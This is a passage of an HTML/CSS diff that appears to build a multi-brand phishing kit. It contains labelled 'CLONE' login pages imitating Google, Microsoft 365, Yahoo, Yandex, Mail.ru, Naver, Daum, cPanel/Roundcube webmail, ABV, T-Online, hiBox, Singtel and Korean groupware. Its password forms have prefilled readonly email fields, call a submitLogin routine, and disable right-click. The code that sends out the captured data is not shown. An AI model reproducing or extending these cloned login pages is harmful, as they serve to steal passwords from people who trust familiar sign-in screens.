+  body.is-singtel{display:flex!important;padding:0!important}
+  body.is-singtel .singtel-layout{display:flex}
+  .singtel-bg{position:fixed;inset:0;z-index:-1;
+    background-image:
+      linear-gradient(180deg,rgba(186,204,218,.95) 0%,rgba(214,208,199,.55) 55%,rgba(120,110,100,.35) 100%),
+      url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1600 900' preserveAspectRatio='xMidYMid slice'><g fill='%235d6b78' opacity='.8'><rect x='900' y='360' width='70' height='420'/><rect x='980' y='270' width='95' height='510'/><rect x='1085' y='400' width='62' height='380'/><rect x='1157' y='310' width='86' height='470'/><rect x='1253' y='430' width='70' height='350'/><rect x='1333' y='365' width='95' height='415'/><rect x='1438' y='455' width='80' height='325'/><rect x='120' y='470' width='60' height='310'/><rect x='190' y='520' width='70' height='260'/></g><g fill='%23efe4d2' opacity='.9'><path d='M0 780h1600v120H0z'/></g><g fill='%23d9cdbb' opacity='.6'><path d='M0 800h1600v100H0z'/></g><g fill='%23c9bda9'><path d='M300 700c0-60 55-105 130-105s130 45 130 105z' opacity='.85'/><path d='M520 720c0-50 45-90 110-90s110 40 110 90z' opacity='.7'/></g></svg>");
+    background-size:cover;background-position:center}
+  .singtel-inner{width:100%;padding:36px 20px 60px;display:flex;flex-direction:column;align-items:center}
+  .singtel-logo{display:flex;align-items:center;gap:9px;font-size:30px;font-weight:800;color:#111;margin-bottom:30px;letter-spacing:-1px}
+  .singtel-logo .dots{display:grid;grid-template-columns:repeat(3,6px);gap:3px}
+  .singtel-logo .dots i{width:6px;height:6px;border-radius:50%;background:#e60028;display:block}
+  .singtel-card{background:#fff;width:100%;max-width:560px;border-radius:12px;padding:44px 40px 34px;box-shadow:0 10px 40px rgba(0,0,0,.18)}
+  .singtel-card h1{font-size:31px;font-weight:600;color:#1a1a1a;margin-bottom:32px;letter-spacing:-.5px}
+  .singtel-field{position:relative;background:#f5f6f8;border-radius:6px;margin-bottom:16px;padding:12px 16px}
+  .singtel-field label{display:block;font-size:12px;color:#7b8493;margin-bottom:3px}
+  .singtel-field input{width:100%;border:none;outline:none;background:transparent;font-size:16px;color:#1a1a1a;padding-right:34px}
+  .singtel-field input::placeholder{color:#5b3fd6}
+  .singtel-eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;font-size:17px;color:#5b3fd6;cursor:pointer}
+  .singtel-btn{width:100%;height:52px;background:#e60028;color:#fff;border:none;border-radius:26px;font-size:17px;font-weight:600;cursor:pointer;margin:18px 0 20px}
+  .singtel-help{display:block;text-align:center;color:#4b32c3;font-size:15px;text-decoration:none}
+  @media(max-width:600px){.singtel-card{padding:30px 22px}.singtel-card h1{font-size:24px}}
+
+  /* =========================================================
+     CLONE 5: YANDEX
+     ========================================================= */
+  .yandex-layout{display:none;width:100%;min-height:100vh;justify-content:center;align-items:flex-start;background:#232323;padding:150px 20px 60px}
+  body.is-yandex{display:flex!important;align-items:center;justify-content:center;background:#232323!important;padding:0}
+  body.is-yandex .yandex-layout{display:flex}
+  .yandex-card{width:100%;max-width:372px;color:#fff;font-family:'YS Text',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+  .yandex-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:40px}
+  .yandex-ic{background:none;border:none;padding:0;cursor:pointer;display:flex;align-items:center;justify-content:center}
+  .yandex-ic svg{width:24px;height:24px;fill:#fff}
+  .yandex-logo-text{font-size:20px;font-weight:700;letter-spacing:-.5px;display:flex;align-items:center;gap:8px;color:#fff}
+  .yandex-logo-text span{background:#fff;color:#232323;padding:1px 5px;border-radius:4px;font-size:13px;font-weight:900;letter-spacing:0}
+  .yandex-title{font-size:22px;font-weight:700;text-align:center;margin-bottom:8px;color:#fff}
+  .yandex-subtitle{font-size:15px;color:#aaa;text-align:center;line-height:1.45;margin-bottom:30px}
+  .yandex-subtitle b{color:#e8e8e8;font-weight:400;word-break:break-all}
+  .yandex-input-wrap{position:relative;margin-bottom:14px}
+  .yandex-input-wrap input{width:100%;background:#232323;border:2px solid #555;border-radius:12px;padding:15px 48px 15px 16px;font-size:17px;color:#fff;outline:none;transition:border-color .2s}
+  .yandex-input-wrap input:focus{border-color:#007bff}
+  .yandex-input-wrap input::placeholder{color:#888}
+  .yandex-eye{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#888;display:flex;align-items:center;padding:0}
+  .yandex-eye svg{width:22px;height:22px;fill:currentColor}
+  .yandex-forgot{color:#aaa;font-size:14px;text-decoration:none;display:inline-block;margin-bottom:26px}
+  .yandex-btn-main{width:100%;background:#333;color:#777;border:none;padding:15px;border-radius:12px;font-size:16px;font-weight:600;cursor:not-allowed;margin-bottom:16px;transition:background .2s,color .2s}
+  .yandex-btn-main.active{background:#007bff;color:#fff;cursor:pointer}
+  .yandex-btn-main.active:hover{background:#0069d9}
+  .yandex-btn-sec{width:100%;background:transparent;border:1px solid #555;color:#fff;padding:13px;border-radius:12px;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:12px;transition:background .2s}
+  .yandex-btn-sec:hover{background:#333}
+  .yandex-btn-sec svg{width:20px;height:20px;fill:#fff;flex:0 0 20px}
+  .yandex-info-text{text-align:center;font-size:13px;color:#aaa;line-height:1.55;margin:24px 0 34px}
+  .yandex-info-text b{color:#e8e8e8;font-weight:500;word-break:break-all}
+  .yandex-footer-text{text-align:center;font-size:13px;color:#aaa;line-height:1.6}
+  .yandex-footer-text a{color:#fff;text-decoration:none;font-weight:500}
+  .yandex-layout .err-box{color:#ff9a9a}
+
+  /* =========================================================
+     CLONE 6: MAIL.RU
+     ========================================================= */
+  .mailru-layout{display:none;width:100%;min-height:100vh;justify-content:center;align-items:center;background:#f4f4f4;padding:20px}
+  body.is-mailru{display:flex!important;align-items:center;justify-content:center;background:#f4f4f4!important;padding:0}
+  body.is-mailru .mailru-layout{display:flex}
+  .mailru-card{background:#fff;width:100%;max-width:400px;border-radius:8px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,.1);text-align:center}
+  .mailru-logo{font-size:36px;font-weight:bold;color:#005ff9;margin-bottom:30px;letter-spacing:-1px}
+  .mailru-email{font-size:14px;color:#333;margin-bottom:20px;font-weight:500;word-break:break-all}
+  .mailru-input-group{position:relative;margin-bottom:15px}
+  .mailru-input{width:100%;padding:12px 42px 12px 14px;border:1px solid #ccc;border-radius:4px;font-size:16px}
+  .mailru-input:focus{outline:none;border-color:#005ff9}
+  .mailru-eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;color:#8a8a8a;cursor:pointer;font-size:17px;line-height:1}
+  .mailru-btn{width:100%;background:#005ff9;color:#fff;border:none;padding:12px;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
+  .mailru-footer{font-size:12px;color:#999;margin-top:30px}
+
+  /* ---------- GENERIC ---------- */
+  .login-container{background:#fff;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.2);max-width:420px;width:100%;padding:48px 40px}
+  .header{text-align:center;margin-bottom:32px}
+  .logo-icon{width:64px;height:64px;border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;color:#fff;font-size:28px;font-weight:700}
+  .logo-text{font-size:24px;font-weight:700}
+  .subtitle{color:#5f6368;font-size:14px;margin-top:4px}
+  .domain-badge{display:inline-block;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:600;margin-top:8px}
+  .form-group{margin-bottom:20px}
+  .form-group label{display:block;color:#3c4043;font-size:14px;font-weight:500;margin-bottom:6px}
+  .form-group input{width:100%;padding:12px 14px;border:2px solid #dadce0;border-radius:8px;font-size:15px}
+  .password-wrapper{position:relative}
+  .password-wrapper input{padding-right:44px}
+  .toggle-password{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#9aa0a6;cursor:pointer;font-size:18px}
+  .btn-signin{width:100%;padding:14px;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer}
+  .footer-links{display:flex;justify-content:space-between;margin-top:20px;font-size:13px}
+  .footer-links a{color:#1a73e8;text-decoration:none}
+  .footer-text{text-align:center;margin-top:24px;padding-top:20px;border-top:1px solid #e8eaed;font-size:12px;color:#9aa0a6}
+
+  /* ---------- LOADING ---------- */
+  .loading-layout{display:none;width:100vw;height:100vh;justify-content:center;align-items:center;background:#fafafa;position:fixed;inset:0;z-index:999}
+  body.is-loading{display:block!important;padding:0!important}
+  body.is-loading .loading-layout{display:flex}
+  .spinner{width:40px;height:40px;border:4px solid #f0f0f0;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body oncontextmenu="return false;">
+
+<div class="loading-layout" id="loadingContainer"><div class="spinner"></div></div>
+
+<!-- DAOU -->
+<div id="daouContainer" style="display:none">
+  <div class="daou-notice">
+    <span class="pill">공지</span>
+    <div><h2>시스템 점검 사전 안내</h2>
+      <div class="meta">일시 <b>2026년 11월 28일(토) 15:00 ~ 11월 29일(일) 15:00 (24시간)</b><br>영향 <b>점검 시간 동안 전 서비스 이용 불가</b></div>
+    </div>
+    <div class="daou-close" onclick="this.parentElement.style.display='none'">✕ 다시보지 않기</div>
+  </div>
+  <div class="daou-wrap">
+    <div class="daou-logo">JUNOTNC<small>TECHNOLOGY &amp; CONSULTING</small></div>
+    <div class="daou-field"><label>아이디</label><input type="email" id="daouEmail" readonly>
+      <button class="daou-clear" onclick="document.getElementById('daouEmail').value=''">✕</button></div>
+    <div class="daou-field"><label>비밀번호</label><input type="password" id="daouPass" autocomplete="off"></div>
+    <div class="daou-row"><label><input type="checkbox"> 계정 기억</label><a href="#">비밀번호 초기회</a></div>
+    <button class="daou-btn" id="daouBtn" onclick="submitLogin('daou')">로그인</button>
+    <div class="daou-lang">⌄ 한국어</div>
+    <div class="daou-divider"></div>
+    <button class="daou-app">⭳ 앱 다운로드</button>
+    <div id="daou-err" class="err-box" style="text-align:center"></div>
+    <div class="daou-foot">© DAOU Office</div>
+  </div>
+</div>
+
+<!-- HIWORKS -->
+<div id="hiworksContainer" style="display:none">
+  <div class="hiworks-top-left">hiworks</div>
+  <div class="hiworks-container">
+    <div class="hiworks-center-logo" id="hiworksBigLogo">hiworks</div>
+    <div id="hiworksStep1" style="width:100%">
+      <h1 class="hiworks-h1">Sign-in</h1>
+      <h2 class="hiworks-h2">Please enter login ID with domain</h2>
+      <div class="hiworks-input-wrap">
+        <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        <input type="email" id="hiworksEmail" placeholder="id@company.onhiworks.com" readonly>
+      </div>
+      <div class="hiworks-input-wrap">
+        <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        <input type="password" id="hiworksPass" placeholder="Password" autocomplete="off">
+      </div>
+      <button type="button" class="hiworks-btn" id="hiworksNext">Next</button>
+      <div id="hiworks-err1" class="err-box" style="text-align:left"></div>
+      <div class="hiworks-links-row">
+        <a href="#">Sign in with another ID</a><span>|</span><a href="#">Forgot password</a>
+        <span class="hiworks-ip-toggle"><span class="hiworks-toggle-switch"></span>IP Security</span>
+      </div>
+    </div>
+    <div id="hiworksStep2" style="display:none;width:100%">
+      <h1 class="hiworks-h1">Sign in to <span id="hiworksOrg">Company</span></h1>
+      <h2 class="hiworks-h2">Please enter your password for identity verification.</h2>
+      <div class="hiworks-email-chip">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        <span id="hiworksChip">user@domain.com</span>
+      </div>
+      <div class="hiworks-input-wrap">
+        <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        <input type="password" id="hiworksPass2" placeholder="Password" autocomplete="off">
+      </div>
+      <button type="button" class="hiworks-btn on" id="hiworksSignIn">Sign-in</button>
+      <div id="hiworks-err2" class="err-box" style="text-align:left"></div>
+      <div class="hiworks-links-row">
+        <a href="#">Sign in with another ID</a><span>|</span><a href="#">Forgot password</a>
+        <span class="hiworks-ip-toggle"><span class="hiworks-toggle-switch"></span>IP Security</span>
+      </div>
+      <div class="hiworks-notice" id="hiworksNotice"><strong>현재 비밀번호를 입력해 주세요.</strong></div>
+    </div>
+    <div class="hiworks-banner">
+      <div class="hiworks-banner-text"><h3>영업 기회부터 계약까지</h3><p>하이웍스 세일즈로 관리하세요</p></div>
+      <div class="hiworks-banner-img"><svg width="120" height="70" viewBox="0 0 120 70"><polyline points="5,55 25,40 45,48 65,30 85,22 110,34" stroke="#f5a623" stroke-width="3" fill="none" stroke-linecap="round"/></svg></div>
+    </div>
+  </div>
+  <div class="hiworks-footer">© Gabia Inc.</div>
+  <div class="hiworks-overlay" id="hiworksOverlay"><div class="sp"></div><div class="tx" id="hiworksOverlayText">Verifying...</div></div>
+</div>
+
+<!-- ABV -->
+<div id="abvContainer" style="display:none">
+  <div class="abv-stage">
+  <div class="framer-k1yVm">
+    <div class="framer-l37xyv">
+      <div class="framer-1uj2ez6"><img width="25" height="27" draggable="false" src="https://framerusercontent.com/images/casWq2XT2AxtIAfXFrCfMV2R0.svg?width=25&height=27" alt="АБВ поща" style="width:100%;height:100%"></div>
+      <div class="framer-13rvrfu"><p style="font-size:14px;font-weight:900;line-height:14px;color:#000">АБВ Поща</p></div>
+      <div class="framer-i0rsf2"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">DOX</p></div>
+      <div class="framer-1inf8b4"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ на твой домейн</p></div>
+      <div class="framer-14zwyi7"><img width="101" height="15" draggable="false" src="https://framerusercontent.com/images/uebBbbNZYu4aV5MVIkBR0U26F2M.svg?width=101&height=15" alt="АБВ TruStsuite" style="width:100%"></div>
+      <div class="framer-1trcrps"><img width="61" height="27" draggable="false" src="https://framerusercontent.com/images/EgViW3Y1mC1GWqjtSx1lBDjhCqs.svg?width=61&height=27" style="width:100%"></div>
+      <div class="framer-e23xuc"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">Регистрация в АБВ</p></div>
+      <div class="framer-1ofzc25"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ профил</p></div>
+    </div>
+    <div class="framer-ivfs9d"><img width="162" height="60" draggable="false" src="https://framerusercontent.com/images/5XhmlwsfPBGpVltxlwiDdG9kbo.svg?width=162&height=60" style="width:100%"></div>
+    <div class="framer-1tyjjwu"><img width="180" height="30" draggable="false" src="https://framerusercontent.com/images/ZeCcpoYP2U97mEHPaGcLCZZ6TUs.svg?width=180&height=30" style="width:100%"></div>
+    <div class="framer-1tqp0cc"><img draggable="false" src="https://framerusercontent.com/images/wBR7zAdtrn6C95FCM4PckzSLiCc.jpg?width=215&height=100" style="width:100%"></div>
+    <div class="framer-1lwhm32"><img draggable="false" src="https://framerusercontent.com/images/p6OxGGbP252qR6YGCNy37MAumxs.jpg?width=215&height=100" style="width:100%"></div>
+    <div class="framer-1cb6bps"><img draggable="false" src="https://framerusercontent.com/images/k3u3mM2vefXrTni654AVuXGYQw.jpg?width=215&height=100" style="width:100%"></div>
+    <div class="framer-1op5ul"><img draggable="false" src="https://framerusercontent.com/images/mR27Z9ciB9VoWIUmbkgcgfR97tU.jpg?width=1000&height=600" style="width:100%"></div>
+    <div class="framer-heb492"><img draggable="false" src="https://framerusercontent.com/images/7u0tWTuqrVIRhnkaOAu2Kx3EVH0.jpg?width=260&height=180" style="width:100%"></div>
+    <div class="framer-1srjyxk"><img draggable="false" src="https://framerusercontent.com/images/UZRgbZYB2TjD2gdiDjaQo3wb5qg.jpg?width=260&height=180" style="width:100%"></div>
+    <div class="framer-195nnv8">
+      <div class="framer-nmkhwe"><h2 style="font-size:21px;color:rgb(47,47,47);font-weight:400">Вход в АБВ Поща</h2></div>
+      <div class="framer-zgdkdg"><img width="305" height="247" draggable="false" src="https://framerusercontent.com/images/sgSVom1iXFk6VFGgXqvmmuMUbt4.png?width=305&height=247" style="width:100%"></div>
+      <div class="framer-17sdx75"><p style="font-size:11px;color:rgb(47,47,47)">Нямаш профил в АБВ? <a href="https://passport.abv.bg/app/profiles/registration" style="color:rgb(30,147,12)">Регистрирай се!</a></p></div>
+      <div class="framer-1ivdcrg"><p style="font-size:11px"><a href="https://passport.abv.bg/app/profiles/lostpass" style="color:rgb(22,110,29)">Забравена парола</a></p></div>
+      <form class="framer-PR0MW" onsubmit="return false">
+        <p style="font-size:12px;font-weight:500;color:rgb(20,20,20)">АБВ потребител:</p>
+        <div class="framer-form-text-input"><input type="email" id="abvEmail" name="Email" autocomplete="username"></div>
+        <p style="font-size:12px;font-weight:500;color:rgb(20,20,20)">Парола:</p>
+        <div class="framer-form-text-input"><input type="password" id="abvPass" name="text" autocomplete="off"></div>
+        <button type="button" class="framer-btn" id="abvBtn">Вход</button>
+        <div id="abv-error" class="abv-custom-error"></div>
+        <div id="abv-success" class="abv-custom-success"></div>
+      </form>
+    </div>
+    <div class="framer-1k6dsll">
+      <div class="framer-122upky"><h2 style="font-size:18px;color:rgb(47,47,47);font-weight:400"><a href="https://nova.bg/" target="_blank" style="color:#2f2f2f;text-decoration:none">NOVA</a></h2></div>
+      <div class="framer-6nmjat"><p style="font-size:11px;color:rgb(30,147,12)">Още новини</p></div>
+    </div>
+  </div>
+  </div>
+</div>
+
+<!-- CPANEL -->
+<div id="cpanelContainer" style="display:none">
+  <div class="cp-wrap">
+    <div class="cp-logo">Webmail</div>
+    <div class="cp-label">Email Address</div>
+    <div class="cp-in"><div class="ico">👤</div><input type="email" id="cpanelEmail" readonly></div>
+    <div class="cp-label">Password</div>
+    <div class="cp-in"><div class="ico">🔒</div><input type="password" id="cpanelPass" placeholder="Enter your email password."></div>
+    <button class="cp-btn" id="cpanelBtn" onclick="submitLogin('cpanel')">Log in</button>
+    <a href="#" class="cp-reset">Reset Password</a>
+    <div class="cp-langs"><span>العربية</span><span>čeština</span><span>dansk</span><span>Deutsch</span><span>Ελληνικά</span><span>English</span><span>español</span><span>…</span></div>
+    <div id="cpanel-err" class="err-box" style="text-align:center"></div>
+    <div class="cp-copy"><b>cP</b><br>Copyright 2026 cPanel, L.L.C.<br>Privacy Policy</div>
+  </div>
+</div>
+
+<!-- ROUNDCUBE -->
+<div class="rc-layout" id="webmailContainer" style="display:none">
+  <div class="rc-logo-area">
+    <svg class="rc-logo-svg" viewBox="0 0 100 100"><path d="M20 80 L50 100 L80 80 L80 40 L50 20 L20 40 Z" fill="#37474f"/><path d="M20 80 L50 100 L80 80 L50 60 Z" fill="#1b8cd6"/><circle cx="50" cy="45" r="25" fill="#e0e0e0"/></svg>
+    <div class="rc-brand" id="rcBrand">Webmail</div>
+  </div>
+  <div class="rc-form">
+    <div class="rc-input-group"><div class="rc-input-icon">👤</div><input type="email" id="webmailEmail" readonly disabled></div>
+    <div class="rc-input-group"><div class="rc-input-icon">🔒</div><input type="password" id="webmailPass" placeholder="Password"></div>
+    <button class="rc-btn" id="webmailBtn" onclick="submitLogin('webmail')">LOGIN</button>
+    <div id="webmail-err" class="err-box" style="text-align:center"></div>
+  </div>
+  <div class="rc-footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>
+</div>
+
+<!-- YAHOO -->
+<div id="yahooContainer" style="display:none;width:100%;min-height:100vh;flex-direction:column">
+  <div class="yahoo-top-bar"><div class="yahoo-logo">yahoo!</div><div class="yahoo-nav"><a href="#">Help</a><a href="#">Terms</a><a href="#">Privacy</a></div></div>
+  <div class="yahoo-container"><div class="yahoo-card">
+    <div class="yahoo-email" id="yahooEmailDisplay"></div>
+    <div class="yahoo-title">Enter your password</div>
+    <label class="yahoo-label">Password</label>
+    <div class="yahoo-input-group"><input type="password" id="yahooPass"><button class="yahoo-eye" onclick="toggleYahooPass()">👁️</button></div>
+    <a href="#" class="yahoo-forgot">Forgot password</a>
+    <button class="yahoo-btn" id="yahooBtn" onclick="submitLogin('yahoo')">Next</button>
+    <div id="yahoo-err" class="err-box" style="text-align:center;margin-top:15px"></div>
+  </div></div>
+</div>
+
+<!-- GOOGLE -->
+<div class="google-layout" id="googleContainer" style="display:none">
+  <div class="google-card">
+    <div class="google-left">
+      <svg class="google-logo-svg" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      <h1 class="google-welcome">Welcome</h1>
+      <div class="google-user-pill"><span id="googleEmailDisplay"></span></div>
+    </div>
+    <div class="google-right">
+      <input type="password" id="googlePass" class="google-input" placeholder="Enter your password">
+      <div class="google-checkbox-row"><input type="checkbox" onclick="toggleGooglePass()"><label>Show password</label></div>
+      <div class="google-actions"><a href="#" class="google-forgot">Forgot password?</a><button class="google-btn" id="googleBtn" onclick="submitLogin('google')">Next</button></div>
+      <div id="google-err" class="err-box"></div>
+    </div>
+  </div>
+  <div class="google-footer"><span>English (United States)</span><span>Help · Privacy · Terms</span></div>
+</div>
+
+<!-- M365 -->
+<div class="m365-layout" id="m365Container">
+  <div class="m365-card">
+    <div class="m365-logo"><div class="m365-logo-icon"><div></div><div></div><div></div><div></div></div>Microsoft</div>
+    <div class="m365-back"><span id="m365EmailDisplay"></span></div>
+    <div class="m365-title">Enter password</div>
+    <input type="password" id="m365Pass" class="m365-input" placeholder="Password">
+    <a href="#" class="m365-link">Forgot my password</a>
+    <div class="m365-actions"><button class="m365-btn" id="m365Btn" onclick="submitLogin('m365')">Sign in</button></div>
+    <div class="m365-options">🔑 Sign-in options</div>
+    <div id="m365-err" class="err-box"></div>
+  </div>
+  <div class="m365-foot"><span>Terms of use</span><span>Privacy &amp; cookies</span></div>
+</div>
+
+<!-- NAVER -->
+<div class="naver-layout" id="naverContainer">
+  <div class="naver-wrap">
+    <div class="naver-brand">NAVER</div>
+    <div class="naver-card">
+      <div class="naver-field">
+        <label>ID or phone number</label>
+        <div class="naver-line">
+          <input type="email" id="naverEmail" readonly>
+          <button class="naver-clear" type="button" onclick="document.getElementById('naverEmail').value=''">✕</button>
+        </div>
+      </div>
+      <div class="naver-field">
+        <label>Password</label>
+        <div class="naver-line">
+          <input type="password" id="naverPass" autocomplete="off">
+        </div>
+      </div>
+      <div class="naver-row">
+        <label class="naver-check"><input type="checkbox"> Stay Signed in</label>
+        <span class="naver-ip">IP Security <span class="naver-switch"></span></span>
+      </div>
+      <div class="naver-actions">
+        <button class="naver-passkey" type="button">👥 Passkey</button>
+        <button class="naver-btn" id="naverBtn" onclick="submitLogin('naver')">Sign in</button>
+      </div>
+      <div class="naver-qr">QR sign-in <span>›</span></div>
+      <div id="naver-err" class="err-box" style="text-align:center"></div>
+    </div>
+    <div class="naver-foot-links"><a href="#">Forgot ID</a><span>|</span><a href="#">Forgot password</a><span>|</span><a href="#">Sign up</a></div>
+    <div class="naver-social"><span class="soc apple"></span><span class="soc google">G</span><span class="soc line">LINE</span></div>
+    <div class="naver-bottom"><a href="#">Chatbot</a><a href="#">Help</a><span>English ⌄</span></div>
+    <div class="naver-copy">© NAVER Corp.</div>
+  </div>
+</div>
+
+<!-- DAUM -->
+<div class="daum-layout" id="daumContainer">
+  <div class="daum-card">
+    <div class="daum-logo">Daum <span>메일</span></div>
+    <div class="daum-sub">다음메일 계정으로 로그인합니다.</div>
+    <div class="daum-label">다음메일 주소</div>
+    <input type="email" id="daumEmail" class="daum-input" readonly disabled>
+    <div class="daum-label">비밀번호</div>
+    <input type="password" id="daumPass" class="daum-input" placeholder="비밀번호 (Password)">
+    <div class="daum-row"><label><input type="checkbox" checked> 로그인 상태 유지</label><span>IP 보안 <b>ON</b></span></div>
+    <button class="daum-btn" id="daumBtn" onclick="submitLogin('daum')">로그인 (Log In)</button>
+    <div class="daum-links"><a href="#">아이디 찾기</a><span>|</span><a href="#">비밀번호 찾기</a><span>|</span><a href="#">회원가입</a></div>
+    <div id="daum-err" class="err-box"></div>
+    <div class="daum-foot">© Kakao Corp.</div>
+  </div>
+</div>
+
+<!-- T-ONLINE -->
+<div class="tonline-box" id="tonlineContainer" style="display:none">
+  <div class="tonline-logo"><svg viewBox="0 0 24 24"><path d="M4 4h4v16H4zM10 4h4v16h-4zM16 4h4v16h-4z"/></svg></div>
+  <div class="tonline-header"><div class="tonline-email"><span id="tonlineEmailDisplay"></span></div></div>
+  <div class="tonline-title">Passwort eingeben</div>
+  <div class="tonline-input-group"><input type="password" id="tonlinePass" placeholder="Passwort"><button class="tonline-eye" onclick="toggleTonPass()">👁️</button></div>
+  <a href="#" class="tonline-link">Passwort vergessen?</a>
+  <button class="tonline-btn-main" id="tonlineBtn" onclick="submitLogin('tonline')">LOGIN</button>
+  <div id="tonline-err" class="err-box"></div>
+</div>
+
+<!-- HI-BOX -->
+<div id="hiboxContainer" style="display:none">
+ <div class="hibox-page">
+  <div class="hibox-utility"><div class="hibox-utility-in">
+    <a href="#">Home</a><span>|</span><a href="#">Administrator Login</a>
+    <select><option>English</option><option>繁體中文</option></select>
+  </div></div>
+  <div class="hibox-header">
+    <div class="hibox-logo">hiBox<em>Messaging Services</em></div>
+    <div class="hibox-tiles">
+      <a class="hibox-tile" href="#"><div class="ic">🗂️</div>Products</a>
+      <a class="hibox-tile" href="#"><div class="ic">🧮</div>Pricing</a>
+      <a class="hibox-tile" href="#"><div class="ic">⭐</div>Customer<br>Stories</a>
+      <a class="hibox-tile" href="#"><div class="ic">⬇️</div>Downloads</a>
+      <a class="hibox-tile" href="#"><div class="ic">📋</div>Apply Now</a>
+      <a class="hibox-tile" href="#"><div class="ic">❓</div>FAQ</a>
+      <a class="hibox-tile" href="#"><div class="ic">🎁</div>Free Trial</a>
+      <a class="hibox-tile adm" href="#"><div class="ic"><span>👤</span><span>Administrator<br>Login</span></div></a>
+    </div>
+  </div>
+  <div class="hibox-hero-row">
+    <div class="hibox-hero">
+      <div class="hand"></div>
+      <h2>Comprehensive Email<br>Data Loss Protection Keeps<br>Privacy and Intellectual Property<br>Totally Safe</h2>
+      <div class="mascot">🧑‍💼</div>
+      <div class="hibox-dots"><i></i><i></i><i></i><i></i><i></i><i class="on"></i></div>
+    </div>
+    <div class="hibox-side">
+      <div class="hibox-side-h">👥 Member Sign In</div>
+      <div class="hibox-form">
+        <div class="hibox-frow"><label>Username:</label><input type="email" id="hiboxEmail" readonly><button class="mini">⌨</button></div>
+        <div class="hibox-frow"><label>Password:</label><input type="password" id="hiboxPass"><button class="mini">⌨</button></div>
+        <div class="hibox-frow"><label>Captcha:</label><div class="hibox-cap"><div class="img">K4I</div><button class="rf">⟳</button></div></div>
+        <label class="hibox-remember"><input type="checkbox"> Remember</label>
+        <div class="hibox-btns">
+          <button class="hibox-otp">Use<br>OTP</button>
+          <button class="hibox-login" id="hiboxBtn" onclick="submitLogin('hibox')">Login</button>
+          <button class="hibox-help">Help</button>
+        </div>
+        <div id="hibox-err" class="err-box"></div>
+      </div>
+    </div>
+  </div>
+  <div class="hibox-support">
+    <div class="c1">📞 Taiwan Area Toll-Free Customer Service <b>0800-080-365</b></div>
+    <div>✉️ Technical Support <b>service@hibox.hinet.net</b></div>
+  </div>
+  <div class="hibox-bottom">
+    <div class="hibox-ad"><div class="env">✉️</div>Auditing &amp; Archiving<br>Best Choice for Message Security</div>
+    <div class="hibox-news">
+      <div class="hibox-news-h">News<a href="#">more+</a></div>
+      <ul>
+        <li><span class="n">NEW</span>hiBox系統安全性升級作業通知…</li>
+        <li><span class="n">NEW</span>hiBox Webmail 啟用自動登出機制！</li>
+        <li><span class="n">NEW</span>hiBox Webmail登入安全機制升級，全面啟用圖形驗證碼！</li>
+        <li>hiBox與HiNet繽域同時申辦，享三大優惠…</li>
+        <li>hiBox Alert: Beware of Phishing Emails.</li>
+        <li>為了保護您的資料安全，建議使用支援TLS1.2加密傳輸協定的作業系統…</li>
+      </ul>
+    </div>
+  </div>
+  <div class="hibox-rainbow"></div>
+  <div class="hibox-footer">
+    <div class="row">
+      <div>
+        <div class="rel"><span class="tag">Related site</span><b>MOD</b><span>|</span><b>Click.Taiwan</b></div>
+        <div><a href="#">Term of Service</a> | <a href="#">Privacy Policy</a> | <a href="#">Corporate Citizenship</a> | <a href="#">Contact Us</a></div>
+        <div>Taiwan Area Toll-Free Customer Service 0800-080-365</div>
